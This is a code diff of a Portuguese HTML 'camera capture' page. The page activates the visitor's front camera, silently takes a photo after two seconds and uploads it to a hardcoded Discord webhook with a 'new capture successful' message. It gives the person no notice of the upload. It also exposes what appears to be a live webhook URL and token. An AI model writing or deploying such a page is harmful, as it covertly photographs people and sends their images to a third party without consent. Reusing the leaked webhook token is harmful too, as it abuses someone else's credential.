@@ -1,44 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
+    <meta charset="UTF-8">
     <title>Captura de Câmera</title>
 </head>
 <body>
-    <video id="video" width="320" height="240" autoplay></video>
+    <video id="video" width="320" height="240" autoplay style="border-radius: 8px; background: #000;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        // Cuidado: Expor sua URL de webhook no frontend permite que qualquer um a use.
         const webhookUrl = 'https://discord.com/api/webhooks/1504217043573018646/qRAhMrq1gomwUPPZ9IK6hjjuvQMf-2a5fKPzcUEPrsMuTHsyt3Dwq1r26xbBblZNtWFQ';
 
-        // 1. Acessar Câmera Frontal (facingMode: 'user')
+        // 1. Acessar Câmera
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
             video.srcObject = stream;
             video.play();
-            // Tira a foto após 2 segundos
+            // Tira a foto após 2 segundos para dar tempo da câmera focar
             setTimeout(takeSnapshot, 2000);
+        })
+        .catch(err => {
+            console.error("Erro ao acessar a câmera: ", err);
         });
 
         function takeSnapshot() {
-            // 2. Tirar foto (capturar frame)
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // 3. Converter e Enviar
+            // 2. Converter para Base64
             const imageData = canvas.toDataURL('image/png');
             sendToWebhook(imageData);
         }
 
+        // Função essencial: Transforma o texto Base64 em um arquivo binário (Blob)
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(','), 
+                  mime = arr[0].match(/:(.*?);/)[1],
+                  bstr = atob(arr[1]);
+            let n = bstr.length, 
+                u8arr = new Uint8Array(n);
+            while(n--){
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type: mime});
+        }
+
         function sendToWebhook(data) {
+            const blob = dataURLtoBlob(data);
+            const formData = new FormData();
+            
+            // O Discord precisa do arquivo no campo 'file'
+            formData.append('file', blob, 'screenshot.png');
+            
+            // Opcional: Adicionar conteúdo em texto
+            formData.append('payload_json', JSON.stringify({
+                content: "📸 **Nova captura realizada com sucesso!**"
+            }));
+
             fetch(webhookUrl, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: data })
-            });
+                body: formData // Não definimos headers aqui, o FormData faz isso sozinho
+            })
+            .then(res => {
+                if (res.ok) console.log("Foto enviada para o Discord!");
+                else console.error("Falha no envio:", res.status);
+            })
+            .catch(err => console.error("Erro na requisição:", err));
         }
     </script>
 </body>
